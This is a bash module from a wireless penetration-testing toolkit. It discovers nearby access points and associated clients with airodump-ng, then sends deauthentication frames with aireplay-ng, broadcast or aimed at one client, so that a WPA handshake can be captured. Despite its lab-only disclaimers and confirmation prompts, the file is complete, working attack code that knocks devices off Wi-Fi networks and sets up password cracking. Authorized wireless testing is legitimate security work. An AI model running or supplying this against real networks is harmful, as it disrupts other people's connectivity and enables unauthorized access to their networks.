#!/bin/bash
# =============================================================================
# AirShatter — modules/client_test.sh
# Lab Client Disconnect Test
#
# PURPOSE:
#   Simulate temporary client disconnections in a controlled lab environment
#   to trigger handshake reauthentication events for WPA capture testing.
#
# IMPORTANT:
#   This module is a LAB TESTING FEATURE ONLY.
#   Only use on networks and devices you own or have written permission to test.
#   Unauthorized use is illegal.
#
# Developer: amigoDcyber
# =============================================================================

# ─── Safety gate — shown every time this module is entered ────────────────────
_client_test_disclaimer() {
    echo
    echo -e "${BRED}  ╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRED}  ║          ⚠  LAB TESTING FEATURE — READ CAREFULLY        ║${NC}"
    echo -e "${BRED}  ╠══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${BRED}  ║${NC}  This module sends deauthentication frames to force       ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}  a client device to re-associate with an access point.    ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}                                                           ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}  ${WHITE}Only use on:${NC}                                             ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}  • Your own lab networks and devices                      ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}  • Networks where you have ${WHITE}written authorization${NC}           ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}                                                           ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}  ${RED}Unauthorized use is illegal and may cause network${NC}      ${BRED}║${NC}"
    echo -e "${BRED}  ║${NC}  ${RED}disruption for other users.${NC}                           ${BRED}║${NC}"
    echo -e "${BRED}  ╚══════════════════════════════════════════════════════════╝${NC}"
    echo
    read -rp "$(echo -e "  ${BPURPLE}I confirm this is my authorized lab network [y/N]${NC}: ")" ack
    [[ "${ack,,}" == "y" ]]
}

# ─── Discover clients associated with a target BSSID ─────────────────────────
_discover_clients() {
    local mon_iface="$1"
    local bssid="$2"
    local out="/tmp/as_clients_$$"

    print_info "Scanning for clients associated with $bssid (10 seconds)..."
    echo

    airodump-ng \
        --bssid "$bssid" \
        --write "$out" \
        --output-format csv \
        "$mon_iface" &>/dev/null &
    local pid=$!

    local i=10
    while (( i > 0 )); do
        printf "\r  ${CYAN}Discovering clients... %2ds${NC}" "$i"
        sleep 1
        ((i--))
    done
    printf "\r  ${BGREEN}Discovery complete.        ${NC}\n"
    kill "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null

    local csv="${out}-01.csv"
    if [[ ! -f "$csv" ]]; then
        print_warning "No data captured. Is monitor mode active on $mon_iface?"
        rm -f "${out}"* 2>/dev/null
        return 1
    fi

    # Parse station (client) section
    _discovered_clients=()
    local in_station=false

    while IFS=',' read -r station first_seen last_seen power packets bssid_assoc probed; do
        if [[ "$station" =~ ^[[:space:]]*Station ]]; then
            in_station=true; continue
        fi
        $in_station || continue
        local cs="${station// /}"
        [[ -z "$cs" || ! "$cs" =~ ^[0-9a-fA-F:]{17}$ ]] && continue
        _discovered_clients+=("$cs")
    done < "$csv"

    rm -f "${out}"* 2>/dev/null

    if [[ ${#_discovered_clients[@]} -eq 0 ]]; then
        print_warning "No associated clients found for $bssid"
        print_info "Client may not be actively communicating. Try a longer scan."
        return 1
    fi

    echo
    echo -e "  ${GRAY}Associated clients:${NC}"
    printf "  ${BCYAN}%-5s %-20s${NC}\n" "No." "MAC Address"
    echo -e "  ${GRAY}$(printf '%.0s─' {1..30})${NC}"
    local i=1
    for mac in "${_discovered_clients[@]}"; do
        printf "  ${WHITE}[%-3s]${NC} ${BGREEN}%s${NC}\n" "$i" "$mac"
        ((i++))
    done
    echo

    return 0
}

# ─── Main module entry point ──────────────────────────────────────────────────
module_client_test() {
    print_section "Lab Client Disconnect Test"
    log_separator
    log_action "MODULE" "client_test — entry"

    # Safety gate
    _client_test_disclaimer || {
        print_info "Cancelled."
        log_action "CLIENT_TEST" "User declined disclaimer — aborted"
        return 0
    }

    # Dependency check
    require_tool "aireplay-ng" || { pause; return 1; }
    require_monitor_mode       || { pause; return 1; }

    echo
    echo -e "  ${CYAN}Monitor interface :${NC} ${WHITE}$MONITOR_IFACE${NC}"
    echo

    # ── Step 1: get target BSSID ──────────────────────────────────────────────
    local target_bssid=""

    echo -e "  ${WHITE}Target BSSID selection:${NC}"
    echo -e "  ${BGREEN}[1]${NC} Discover nearby networks first"
    echo -e "  ${BGREEN}[2]${NC} Enter BSSID manually"
    echo -e "  ${BGREEN}[0]${NC} Back"
    echo
    read -rp "$(echo -e "  ${BPURPLE}Choice [0-2]${NC}: ")" bssid_mode

    case "$bssid_mode" in
        1)
            # Quick scan using scanner helper
            local out_prefix="/tmp/as_ct_scan_$$"
            print_info "Scanning for 10 seconds..."

            airodump-ng --write "$out_prefix" --output-format csv \
                        "$MONITOR_IFACE" &>/dev/null &
            local spid=$!
            local si=10
            while (( si > 0 )); do
                printf "\r  ${CYAN}Scanning... %2ds${NC}" "$si"
                sleep 1; ((si--))
            done
            printf "\r  ${BGREEN}Done.              ${NC}\n"
            kill "$spid" 2>/dev/null; wait "$spid" 2>/dev/null

            local scsv="${out_prefix}-01.csv"
            if [[ ! -f "$scsv" ]]; then
                print_warning "Scan produced no data."
                rm -f "${out_prefix}"* 2>/dev/null
                return 1
            fi

            echo
            printf "  ${BCYAN}%-5s %-28s %-19s %-5s${NC}\n" "No." "SSID" "BSSID" "CH"
            echo -e "  ${GRAY}$(printf '%.0s─' {1..62})${NC}"

            local _scan_bssids=() _scan_ssids=()
            local in_sta=false idx=1
            while IFS=',' read -r bssid _ _ ch _ _ _ _ _ _ _ _ _ essid _; do
                [[ "$bssid" =~ ^[[:space:]]*(Station|BSSID) ]] && {
                    [[ "$bssid" =~ Station ]] && in_sta=true; continue; }
                $in_sta && continue
                local cb="${bssid// /}" ce="${essid// /}" cch="${ch// /}"
                [[ -z "$cb" ]] && continue
                printf "  ${WHITE}[%-3s]${NC} ${WHITE}%-28s${NC} ${GRAY}%-19s${NC} ${CYAN}%-5s${NC}\n" \
                       "$idx" "${ce:0:27}" "$cb" "$cch"
                _scan_bssids+=("$cb"); _scan_ssids+=("${ce:-(hidden)}")
                ((idx++))
            done < "$scsv"
            rm -f "${out_prefix}"* 2>/dev/null

            echo
            read -rp "$(echo -e "  ${BPURPLE}Select network number${NC}: ")" tnum
            if [[ "$tnum" =~ ^[0-9]+$ ]] && \
               (( tnum >= 1 && tnum <= ${#_scan_bssids[@]} )); then
                target_bssid="${_scan_bssids[$((tnum-1))]}"
                print_success "Target: ${_scan_ssids[$((tnum-1))]} ($target_bssid)"
            else
                print_error "Invalid selection."
                return 1
            fi
            ;;
        2)
            read -rp "$(echo -e "  ${BPURPLE}Enter target BSSID (XX:XX:XX:XX:XX:XX)${NC}: ")" target_bssid
            target_bssid="${target_bssid// /}"
            if [[ ! "$target_bssid" =~ ^[0-9a-fA-F:]{17}$ ]]; then
                print_error "Invalid BSSID format."
                return 1
            fi
            ;;
        0) return 0 ;;
        *) print_error "Invalid choice."; return 1 ;;
    esac

    # ── Step 2: client selection ──────────────────────────────────────────────
    local target_client="FF:FF:FF:FF:FF:FF"  # default = broadcast

    echo
    echo -e "  ${WHITE}Client target:${NC}"
    echo -e "  ${BGREEN}[1]${NC} Broadcast     ${GRAY}(affects all associated clients — lab use only)${NC}"
    echo -e "  ${BGREEN}[2]${NC} Discover and select a specific client"
    echo -e "  ${BGREEN}[3]${NC} Enter client MAC manually"
    echo
    read -rp "$(echo -e "  ${BPURPLE}Choice [1-3]${NC}: ")" client_mode

    case "$client_mode" in
        1) target_client="FF:FF:FF:FF:FF:FF" ;;
        2)
            _discover_clients "$MONITOR_IFACE" "$target_bssid" || {
                read -rp "$(echo -e "  ${BPURPLE}Enter MAC manually instead? [y/N]${NC}: ")" fb
                if [[ "${fb,,}" == "y" ]]; then
                    read -rp "  MAC: " target_client
                else
                    return 1
                fi
            }
            if [[ ${#_discovered_clients[@]} -gt 0 ]]; then
                read -rp "$(echo -e "  ${BPURPLE}Select client number (Enter = broadcast)${NC}: ")" cnum
                if [[ "$cnum" =~ ^[0-9]+$ ]] && \
                   (( cnum >= 1 && cnum <= ${#_discovered_clients[@]} )); then
                    target_client="${_discovered_clients[$((cnum-1))]}"
                fi
            fi
            ;;
        3)
            read -rp "$(echo -e "  ${BPURPLE}Client MAC (XX:XX:XX:XX:XX:XX)${NC}: ")" target_client
            target_client="${target_client// /}"
            if [[ ! "$target_client" =~ ^[0-9a-fA-F:]{17}$ ]]; then
                print_error "Invalid MAC format."
                return 1
            fi
            ;;
        *) print_error "Invalid choice."; return 1 ;;
    esac

    # ── Step 3: packet count ──────────────────────────────────────────────────
    echo
    read -rp "$(echo -e "  ${BPURPLE}Number of deauth packets [default: 5]${NC}: ")" pkt_count
    pkt_count="${pkt_count:-5}"
    if ! [[ "$pkt_count" =~ ^[0-9]+$ ]] || (( pkt_count < 1 || pkt_count > 100 )); then
        print_warning "Invalid count. Using default: 5"
        pkt_count=5
    fi

    # ── Step 4: confirm and run ───────────────────────────────────────────────
    echo
    echo -e "  ${GRAY}── Test Configuration ─────────────────────────────────────${NC}"
    echo -e "  ${CYAN}Target AP     :${NC} ${WHITE}$target_bssid${NC}"
    echo -e "  ${CYAN}Target Client :${NC} ${WHITE}$target_client${NC}  ${GRAY}$([ "$target_client" = "FF:FF:FF:FF:FF:FF" ] && echo "(broadcast)")${NC}"
    echo -e "  ${CYAN}Packet count  :${NC} ${WHITE}$pkt_count${NC}"
    echo -e "  ${CYAN}Interface     :${NC} ${WHITE}$MONITOR_IFACE${NC}"
    echo
    print_warning "This will temporarily disconnect the selected client(s)."
    echo

    confirm "Proceed with lab test?" || {
        print_info "Cancelled."
        log_action "CLIENT_TEST" "User cancelled before execution"
        return 0
    }

    # Log before execution
    log_client_test "$target_bssid" "$target_client" "$pkt_count"

    echo
    print_info "Sending $pkt_count deauth frame(s)..."
    echo

    # aireplay-ng -0 <count> -a <AP> -c <client> <iface>
    aireplay-ng \
        -0 "$pkt_count" \
        -a "$target_bssid" \
        -c "$target_client" \
        "$MONITOR_IFACE"

    local rc=$?
    echo

    if [[ $rc -eq 0 ]]; then
        print_success "Test complete. Client(s) should re-associate momentarily."
        print_info "Run a packet capture (Menu option 4) to collect the re-auth handshake."
        log_success "CLIENT_TEST complete. rc=0 bssid=$target_bssid client=$target_client count=$pkt_count"
    else
        print_error "aireplay-ng exited with error code $rc"
        print_info "Check that monitor mode is active and the interface supports injection."
        print_info "Test injection support with: aireplay-ng --test $MONITOR_IFACE"
        log_error "CLIENT_TEST failed. rc=$rc bssid=$target_bssid client=$target_client"
    fi
}
